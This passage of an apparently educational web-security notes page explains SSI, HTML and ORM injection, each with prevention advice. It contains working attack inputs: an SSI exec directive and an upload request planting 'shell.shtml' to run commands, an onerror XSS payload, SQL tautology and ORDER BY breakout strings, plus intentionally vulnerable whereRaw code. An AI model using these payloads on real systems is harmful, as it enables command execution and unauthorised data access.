                  <li style="margin-bottom: 15px;">For instance, if the XSLT processor generates an HTML response, HTML-encoding user input before inserting it into the XSL data can prevent XSLT injection vulnerabilities. As HTML-encoding converts all instances of <code>&lt;</code> to <code>&amp;lt;</code> and <code>&gt;</code> to <code>&amp;gt;</code>, an attacker should not be able to inject additional XSLT elements, thus preventing an XSLT injection vulnerability.</li>
                  <li style="margin-bottom: 15px;">Additional hardening measures can mitigate the impact of potential XSLT injection vulnerabilities. These include running the XSLT processor as a low-privilege process, preventing the use of external functions by disabling PHP functions within XSLT, and keeping the XSLT library up to date.</li>
                </ol>

              </div>
            </div>
          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              SSI Injection
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text">
            <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Introduction &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>SSI</strong> &harr; <strong>Server-Side Includes</strong></p>
                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                  <p style="font-size: 1.2rem; margin: 0;"><strong>&rarr; technology that web applications use to create dynamic content on HTML pages.</strong></p>
                </div>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">SSI is supported by many popular web servers such as <a href="https://httpd.apache.org/docs/current/howto/ssi.html" target="_blank" style="color: #2563eb; text-decoration: underline;">Apache</a> and <a href="https://learn.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude" target="_blank" style="color: #2563eb; text-decoration: underline;">IIS</a>.</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; The use of SSI can often be inferred from the file extension. Typical file extensions include <code>.shtml</code>, <code>.shtm</code>, and <code>.stm</code>.</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">However, web servers can be configured to support SSI directives in arbitrary file extensions. As such, we cannot conclusively determine whether SSI is used solely based on the file extension.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; SSI Directives &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; SSI utilizes <code>directives</code> to add dynamically generated content to a static HTML page. These directives consist of the following components &rarr;</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><code>name</code>: the directive's name</li>
                  <li style="margin-bottom: 10px;"><code>parameter name</code>: one or more parameters</li>
                  <li style="margin-bottom: 10px;"><code>value</code>: one or more parameter values</li>
                </ul>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;!--#name param1="value1" param2="value" --&gt;</code>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(1) <code>printenv</code> &rarr;</h3>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;!--#printenv --&gt;</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">This directive prints environment variables. It does not take any variables.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(2) <code>config</code> &rarr;</h3>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;!--#config errmsg="Error!" --&gt;</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">This directive changes the SSI configuration by specifying corresponding parameters.</li>
                  <li style="margin-bottom: 10px;">For instance, it can be used to change the error message using the <code>errmsg</code> parameter:</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(3) <code>echo</code> &rarr;</h3>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" --&gt;</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">This directive prints the value of any variable given in the <code>var</code> parameter. Multiple variables can be printed by specifying multiple <code>var</code> parameters. For instance, the following variables are supported &rarr;
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;"><code>DOCUMENT_NAME</code>: the current file's name</li>
                      <li style="margin-bottom: 5px;"><code>DOCUMENT_URI</code>: the current file's URI</li>
                      <li style="margin-bottom: 5px;"><code>LAST_MODIFIED</code>: timestamp of the last modification of the current file</li>
                      <li style="margin-bottom: 5px;"><code>DATE_LOCAL</code>: local server time</li>
                    </ul>
                  </li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(4) <code>exec</code> &rarr;</h3>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;!--#exec cmd="whoami" --&gt;</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">This directive executes the command given in the <code>cmd</code> parameter:</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(5) <code>include</code> &rarr;</h3>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;!--#include virtual="index.html" --&gt;</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">This directive includes the file specified in the <code>virtual</code> parameter. It only allows for the inclusion of files in the web root directory.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; SSI Injection &rarr;</h2>
                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                  <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; SSI injection occurs when an attacker can inject SSI directives into a file that is subsequently served by the web server, resulting in the execution of the injected SSI directives.</strong></p>
                  <p style="font-size: 1.2rem; margin: 0;">&rarr; This scenario can occur in a variety of circumstances.</p>
                </div>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">For instance, when the web application contains a vulnerable file upload vulnerability that enables an attacker to upload a file containing malicious SSI directives into the web root directory. Additionally, attackers might be able to inject SSI directives if a web application writes user input to a file in the web root directory.</li>
                </ul>

                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 10px;">The web application has a <strong>file upload functionality</strong> (e.g., upload profile picture or HTML file).</li>
                  <li style="margin-bottom: 10px;">The application <strong>does not properly validate the uploaded file content</strong>.</li>
                  <li style="margin-bottom: 10px;">An attacker uploads a file containing <strong>malicious SSI directives</strong>, for example:
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 10px 0; overflow-x: auto;">&lt;!--#exec cmd="whoami" --&gt;</code>
                  </li>
                  <li style="margin-bottom: 10px;">The application saves this file inside the <strong>web root directory</strong> (e.g., <code>/var/www/html/</code>), making it accessible via the browser.</li>
                  <li style="margin-bottom: 10px;">The web server has <strong>SSI enabled</strong> and processes the file.</li>
                  <li style="margin-bottom: 10px;">When the attacker (or any user) accesses the uploaded file:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">The server executes the SSI directive</li>
                      <li style="margin-bottom: 5px;">The command output is returned in the HTTP response</li>
                    </ul>
                  </li>
                </ol>

                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">POST /upload HTTP/1.1
Host: victim.com
Content-Type: multipart/form-data; boundary=----123

------123
Content-Disposition: form-data; name="file"; filename="shell.shtml"
Content-Type: text/html

&lt;html&gt;
&lt;body&gt;
&lt;!--#exec cmd="whoami" --&gt;
&lt;/body&gt;
&lt;/html&gt;
------123--</code>

                <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; access uploaded file &rarr;</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">http://victim.com/uploads/shell.shtml

HTTP/1.1 200 OK

&lt;html&gt;
&lt;body&gt;
www-data
&lt;/body&gt;
&lt;/html&gt;</code>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How Prevent is &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">As with any injection vulnerability, developers must carefully validate and sanitize user input to prevent SSI injection.</li>
                  <li style="margin-bottom: 10px;">This is particularly important when user input is used within SSI directives or written to files that may contain SSI directives according to the web server configuration.</li>
                  <li style="margin-bottom: 10px;">Additionally, it is vital to configure the web server to restrict the use of SSI to particular file extensions and potentially even particular directories.</li>
                  <li style="margin-bottom: 10px;">Additionally, the capabilities of specific SSI directives can be limited to mitigate the impact of SSI injection vulnerabilities. For instance, it may be possible to disable the <code>exec</code> directive if it is not actively required.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Resources &rarr;</h2>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                  <a href="https://www.notion.so/Attacks-33627bcaaa9680628e86dbb40e11820b?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Attacks <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                </div>

              </div>
            </div>
          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              HTML Injection
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text">
            <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">

                <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection" target="_blank" style="color: #2563eb; text-decoration: underline;">HTML injection</a> occurs when unfiltered user input is displayed on the page.</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through <code>JavaScript</code> on the front end.</li>
                  <li style="margin-bottom: 10px;">When a user has complete control of how their input will be displayed, they can submit <code>HTML</code> code, and the browser may display it as part of the page.
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">This may include a malicious <code>HTML</code> code, like an external login form, which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 10px;">Another example of <code>HTML Injection</code> is web page defacing.
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">This consists of injecting new <code>HTML</code> code to change the web page's appearance, inserting malicious ads, or even completely changing the page. This type of attack can result in severe reputational damage to the company hosting the web application.</li>
                    </ul>
                  </li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Example &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; we have this function that take user input and display on page &rarr;</p>
                
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;html&gt;

&lt;body&gt;
    &lt;button onclick="inputFunction()"&gt;Click to enter your name&lt;/button&gt;
    &lt;p id="output"&gt;&lt;/p&gt;

    &lt;script&gt;
        function inputFunction() {
            var input = prompt("Please enter your name", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    &lt;/script&gt;
&lt;/body&gt;

&lt;/html&gt;</code>

                <p style="font-size: 1.2rem; margin-bottom: 20px; font-weight: bold;">&rarr; can bypass it to make HTML injection &rarr;</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;h1&gt;abcdef&lt;h1&gt;</code>

                <p style="font-size: 1.2rem; margin-bottom: 20px; font-weight: bold;">&rarr; also we can get XSS &rarr;</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;img src=x onerror=alert(1) &gt;</code>

              </div>
            </div>
          </div>
        </article>
        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              ORM Injection
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>
          <div class="section__text">
            <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">
                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">&rarr; Object-Relational Mapping &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; Programming Technique used to map object in application to database tables.</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">allow developer interact with Database using Object Oriented Programming instead of write SQL queries</li>
                  <li style="margin-bottom: 10px;">bridges the gap between Object Oriented Programming Languages and Relational Database</li>
                  <li style="margin-bottom: 10px;">mapping classes to database tables and objects to rows within those tables and attributes to columns.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Purpose &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; The primary purpose of an ORM is to abstract the database layer, allowing developers to work with objects rather than tables and rows...</strong></p>
                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr; Bridge Between Object-Oriented Code and Relational Databases &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Relational databases store data in tables, while object-oriented programming languages use objects and classes.</li>
                  <li style="margin-bottom: 10px;">ORM translates object structures into table structures and vice versa, enabling seamless interaction.</li>
                </ul>
                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr; Simplify Database Operations &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">ORMs provide a high-level API for performing common database operations like CRUD (Create, Read, Update, Delete) without requiring SQL knowledge.</li>
                </ul>
                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3 &rarr; Reduce Boilerplate Code &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">ORM eliminates repetitive SQL code, allowing developers to focus on application logic rather than database interaction details.</li>
                </ul>
                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">4 &rarr; Enhance Security &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">ORM frameworks often include mechanisms like parameterized queries, which help mitigate vulnerabilities like SQL Injection.</li>
                </ul>
                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">5 &rarr; Increase Developer Productivity &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">By reducing the complexity of database queries and automating data transformations, ORM speeds up development time.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How ORM Works &rarr;</h2>
                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr; Entity-to-Table Mapping &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Each class in the application corresponds to a database table.</li>
                  <li style="margin-bottom: 10px;">Each attribute of the class represents a column in the table.</li>
                  <li style="margin-bottom: 10px;">each object is a row</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr; CRUD Operations &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Create &rarr;</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">use App\Models\User;

// Create a new user
$user = new User();
$user-&gt;name = 'Admin';
$user-&gt;email = 'admin@example.com';
$user-&gt;password = bcrypt('password'); 
$user-&gt;save();</code>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">The save method prepares the entity for insertion and executes the SQL INSERT statement to add the new record to the users table. The <code>bcrypt()</code> function is used to securely hash the password before saving it.</p>

                <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Read &rarr;</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">use App\Models\User;

// Find a user by ID
$user = User::find(1);

// Find all users
$allUsers = User::all();

// Find users by specific criteria
$admins = User::where('email', 'admin@example.com')-&gt;get();</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">This code demonstrates different ways to retrieve records from the database.</li>
                  <li style="margin-bottom: 10px;">The function <code>find(1)</code> retrieves the user with ID 1 by executing a SELECT SQL statement.</li>
                  <li style="margin-bottom: 10px;">The function <code>all()</code> retrieves all users by executing a <code>SELECT * FROM users</code> SQL statement.</li>
                  <li style="margin-bottom: 10px;">The clause <code>where('email', 'admin@example.com')-&gt;get()</code> retrieves users with the specified email by executing a <code>SELECT * FROM users WHERE email = 'admin@example.com'</code> SQL statement</li>
                </ul>

                <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Update &amp; Delete &rarr;</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">The update and delete functionalities follow a straightforward approach using Laravel's Eloquent ORM. For updates, you retrieve the existing record, modify its properties, and save the changes.</li>
                  <li style="margin-bottom: 10px;">For deletions, you retrieve the record and call the delete method to remove it from the database.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3 &rarr; Abstraction of Database Queries &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">Developers interact with the database through high-level APIs, which the ORM translates into SQL queries.</p>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Configuration &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">We need to configure our database credentials. Laravel uses the <code>.env</code> file to store environment variables, including database credentials.</li>
                  <li style="margin-bottom: 10px;"><strong>Setting Up Migration:</strong> Migrations are like version control for your database, allowing you to easily modify and share the database schema.</li>
                  <li style="margin-bottom: 10px;">To create a migration, we can use the <code>Artisan</code> command-line tool: <br>
                    <code style="display: inline-block; background: #f3f4f6; padding: 5px 10px; border-radius: 4px; font-family: monospace; color: #ef4444; margin-top: 5px;">php artisan make:migration create_users_table --create=users</code>
                  </li>
                </ul>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;?php
use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
class CreateUsersTable extends Migration
{
    public function up()
    {
        Schema::create('users', function (Blueprint $table) {
            $table-&gt;id();
            $table-&gt;string('name');
            $table-&gt;string('email')-&gt;unique();
            $table-&gt;string('password');
            $table-&gt;timestamps();
        });
    }
    public function down()
    {
        Schema::dropIfExists('users');
    }
}</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">In the above code, the <code>up()</code> method defines the structure of the users table. Conversely, the <code>down()</code> method drops the table if rolled back.</li>
                  <li style="margin-bottom: 10px;">In the context of ORM, migrations simplify the process of mapping database tables to application models.</li>
                  <li style="margin-bottom: 10px;">From a red team perspective, improperly configured migrations and weak implementations can lead to vulnerabilities like ORM injection.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; What is ORM Injection &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Type of injection vulnerability that targets applications using an Object-Relational Mapping (ORM) framework to interact with a database.</li>
                  <li style="margin-bottom: 10px;">It occurs when untrusted user input is improperly sanitized and passed to ORM query methods, allowing an attacker to manipulate the underlying SQL query.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Causes of ORM Injection &rarr;</h2>
                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 10px;"><strong>Improper Input Validation:</strong> Failure to validate or sanitize user input allows malicious payloads to be passed into ORM methods.</li>
                  <li style="margin-bottom: 10px;"><strong>Dynamic Query Construction:</strong> Building dynamic queries by concatenating strings with user input introduces vulnerabilities.</li>
                  <li style="margin-bottom: 10px;"><strong>Use of Raw SQL in ORM:</strong> Many ORM frameworks allow developers to write raw SQL for complex queries. If raw SQL includes unsanitized user input, it becomes vulnerable.</li>
                  <li style="margin-bottom: 10px;"><strong>Developer Misuse:</strong> Developers may inadvertently bypass ORM safeguards or misuse query-building features.</li>
                </ol>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Identify &amp; Exploit ORM Injection &rarr;</h2>
                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Techniques for Testing &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Source Code Review, use automated tools, input validation testing, Error-Based Testing.</li>
                </ul>
                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Frameworks and Common Vulnerable Methods &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Laravel (Eloquent):</strong> <code>whereRaw()</code>, <code>DB::raw()</code></li>
                  <li style="margin-bottom: 10px;"><strong>Ruby on Rails (Active Record):</strong> <code>where("name = '#{input}'")</code></li>
                  <li style="margin-bottom: 10px;"><strong>Django:</strong> <code>extra()</code>, <code>raw()</code></li>
                  <li style="margin-bottom: 10px;"><strong>Spring (Hibernate):</strong> <code>createQuery()</code> with concatenation</li>
                  <li style="margin-bottom: 10px;"><strong>Node.js (Sequelize):</strong> <code>sequelize.query()</code></li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Exploit Weak Implementation &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Vulnerable Code &rarr;</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">public function searchBlindVulnerable(Request $request)
{
    $users = [];
    $email = $request-&gt;input('email');
    $users = Admins::whereRaw("email = '$email'")-&gt;get();
    if ($users) {
        return view('user', ['users' =&gt; $users]);
    } else {
        return view('user', ['message' =&gt; 'User not found']);
    }
}</code>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">If an attacker inputs <code>1' OR '1'='1</code>, the resulting SQL query becomes: <code>SELECT * FROM users WHERE email = '1' OR '1'='1';</code> which evaluates to true perpetually.</p>

                <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Secure Version of Code &rarr;</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">public function searchBlindSecure(Request $request)
{
    $email = $request-&gt;input('email');
    $users = User::where('email', $email)-&gt;get();
    if (isset($users) &amp;&amp; count($users) &gt; 0) {
        return view('user', ['users' =&gt; $users]);
    } else {
        return view('user', ['message' =&gt; 'User not found']);
    }
}</code>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">Instead of using <code>whereRaw()</code>, the secure version uses Eloquent's <code>where()</code> method. This method automatically escapes the input and constructs a parameterized query behind the scenes.</p>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Exploit Vulnerable Library (Example) &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">An example is the Laravel query builder package vulnerability prior to version 1.17.1, where sorting parameters directly from user input were unsanitized.</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">"SQLSTATE[42S22]: Column not found: 1054 Unknown column 'name'OR'a'='a' in 'order clause' ..."</code>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">To achieve execution, an attacker can utilize the <code>-&gt;</code> operator (alias for <code>json_extract</code> function in MySQL). By using the <code>-&gt;</code> operator with the <code>"%27))</code> payload, we break out of the ORDER BY clause. Final payload: <code>name-&gt;"%27)) LIMIT 10#</code></p>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Best Practices &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Input validation:</strong> Validate data format, type, and length.</li>
                  <li style="margin-bottom: 10px;"><strong>Parameterised queries:</strong> Treat user input as data, not executable code.</li>
                  <li style="margin-bottom: 10px;"><strong>ORM usage:</strong> Utilise ORM built-in tools correctly and securely.</li>
                  <li style="margin-bottom: 10px;"><strong>Escaping and sanitisation:</strong> Remove special characters used for injection attacks.</li>
                  <li style="margin-bottom: 10px;"><strong>Allow list input:</strong> Implement an allowlist approach for expected values.</li>
                </ul>

              </div>
            </div>
          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              LDAP Injection
            </h2>
